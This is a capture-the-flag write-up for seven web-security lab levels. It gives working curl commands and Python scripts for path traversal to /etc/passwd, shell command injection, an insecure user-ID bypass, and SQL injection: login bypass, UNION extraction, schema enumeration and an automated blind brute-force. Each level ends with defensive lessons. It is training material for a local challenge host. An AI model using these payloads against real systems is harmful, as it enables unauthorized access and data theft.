# Web Security Challenges

---

## Level 1: Path Traversal

**Problem Statement:**  
Bypass file access restrictions to read sensitive files on the server using path traversal.

**Approach:**  
- Attempted to access `/etc/passwd` by manipulating the URL path.
- Discovered the server required a `path` argument.
- Used `?path=/../../../etc/passwd` to successfully read the file.
- Used the same technique to access the `/flag` file.

**Example Exploit:**
```sh
curl http://challenge.localhost:80?path=/../../../etc/passwd --path-as-is -i
curl http://challenge.localhost:80?path=/../../../flag --path-as-is -i
```

**Tools Used:**  
- `curl` with `--path-as-is` to avoid URL normalization.

**Key Lessons Learned:**  
- Path traversal vulnerabilities can be exploited by manipulating URL parameters.
- Servers may leak information about required parameters in error messages.
- Always validate and sanitize user input on the server side.

---

## Level 2: Command Injection

**Problem Statement:**  
Exploit a command injection vulnerability to execute arbitrary commands and retrieve the flag.

**Approach:**  
- Noticed the `timezone` parameter was passed to a shell command.
- Injected shell commands using `;` to chain commands (e.g., `;cat /flag;`).
- Used both `curl` and Python’s `requests` to automate the attack.

**Example Exploit:**
```sh
curl --path-as-is "http://challenge.localhost:80?timezone=whoami;id;"
```
```python
url = "http://challenge.localhost:80?timezone=who;cat /flag;"
data = {"Cookie": "c61b7eb3605bc2a2fdbbcac920bdd414"}
response = re.post(url , data=data )
print(response.text)
```

**Tools Used:**  
- `curl`
- Python `requests` library

**Key Lessons Learned:**  
- Unsanitized input passed to shell commands can lead to command injection.
- Error messages and stack traces can reveal how input is processed.
- Always use parameterized APIs or proper input validation when invoking system commands.

---

## Level 3: Authentication Logic Flaw

**Problem Statement:**  
Bypass authentication to access the flag by exploiting logic flaws in user ID handling.

**Approach:**  
- Analyzed the source code and found that after login, the user is redirected with a `user` parameter.
- Directly accessed the endpoint with `?user=1` to retrieve the flag.

**Example Exploit:**
```sh
curl http://challenge.localhost:80?user=1
```

**Tools Used:**  
- `curl`
- Source code review

**Key Lessons Learned:**  
- User IDs in URLs can be manipulated to access other users’ data.
- Never trust user-supplied identifiers without proper authorization checks.

---

## Level 4: SQL Injection (Login Bypass)

**Problem Statement:**  
Exploit SQL injection in the login form to bypass authentication and access the flag.

**Approach:**  
- Identified that user input was directly interpolated into SQL queries.
- Used payloads like `flag" --` and `" or 1=1--` to bypass password checks and retrieve the flag.

**Example Exploit:**
```python
# Bypass with always-true condition
url = "http://challenge.localhost:80"
data = {"username": '" or 1=1--', "password": "admin"}
response = rq.post(url, data=data)
print(response.text)

# Get flag user directly
url = "http://challenge.localhost:80"
data = {"username": 'flag" --', "password": "admin"}
response = rq.post(url, data=data)
print(response.text)
```

**Tools Used:**  
- Python `requests` library for automating login attempts

**Key Lessons Learned:**  
- String interpolation in SQL queries is highly dangerous.
- Always use parameterized queries to prevent SQL injection.

---

## Level 5: SQL Injection (Data Extraction)

**Problem Statement:**  
Extract sensitive data from the database using SQL injection in a search parameter.

**Approach:**  
- Exploited the `LIKE` clause in the query parameter to enumerate users.
- Used a `UNION SELECT` payload to extract the flag from the database.

**Example Exploit:**
```python
# Enumerate users
url = "http://challenge.localhost:80"
data = {"query": "f%"}
response = rq.post(url, params=data)
print(response.text)

# Extract flag with UNION
url = "http://challenge.localhost:80"
data = {'query': '" UNION SELECT password FROM users --'}
response = rq.post(url, params=data)
print(response.text)
```

**Tools Used:**  
- Python `requests` library

**Key Lessons Learned:**  
- Even seemingly harmless search features can be vulnerable to SQL injection.
- UNION-based SQL injection can be used to extract arbitrary data.

---

## Level 6: SQL Injection with Unknown Table Name

**Problem Statement:**  
Extract the flag from a table with an unknown, dynamically generated name.

**Approach:**  
- Used SQL injection to enumerate table names via `sqlite_master`.
- Once the table name was discovered, used another injection to extract the flag.

**Example Exploit:**
```python
# Discover table name
url = "http://challenge.localhost:80"
data = {'query': ' " UNION SELECT tbl_name FROM sqlite_master --'}
response = rq.post(url, params=data)
print(response.text)

# Extract flag from discovered table
url = "http://challenge.localhost:80"
data = {'query': ' " UNION SELECT password FROM table6108655952227085405 ; --'}
response = rq.post(url, params=data)
print(response.text)
```

**Tools Used:**  
- Python `requests` library
- Knowledge of SQLite system tables

**Key Lessons Learned:**  
- SQL injection can be used to enumerate database schema.
- Understanding the underlying database system helps in crafting effective attacks.

---

## Level 7: Blind SQL Injection

**Problem Statement:**  
Extract the flag using blind SQL injection, where no direct error or data is returned.

**Approach:**  
- Used the login form to test for password characters one by one using `LIKE` and `GLOB`.
- Automated the process with a Python script to brute-force the flag character by character.

**Example Exploit:**
```python
# Test for password prefix
url = "http://challenge.localhost:80"
data = {'username': 'flag " OR password  LIKE "p%" -- -', 'password': 'pass'}
response = s.post(url, data=data)
print(response.text)

# Automated brute-force
import requests, string
s = requests.Session()
url = "http://challenge.localhost:80"
searchspace = string.ascii_letters + string.digits + '{}_.-'
solution = ''
end = "}"
while end:
    for c in searchspace:
        data = {'username': f'" OR password  GLOB "{solution}{c}*" -- -', 'password': 'pass'}
        response = s.post(url, data=data)
        if response.text.startswith("Hello"):
            solution += c
            print(solution)
            break
    if end == c:
        break
print("Flag is:", solution)
```

**Tools Used:**  
- Python `requests` library
- Python `string` module for brute-forcing

**Key Lessons Learned:**  
- Blind SQL injection requires creative use of application responses to infer data.
- Automating attacks can save significant time in blind scenarios.
- GLOB can be used for case-sensitive matching in SQLite.

---

## Level 8: *(Not Documented)*

--- 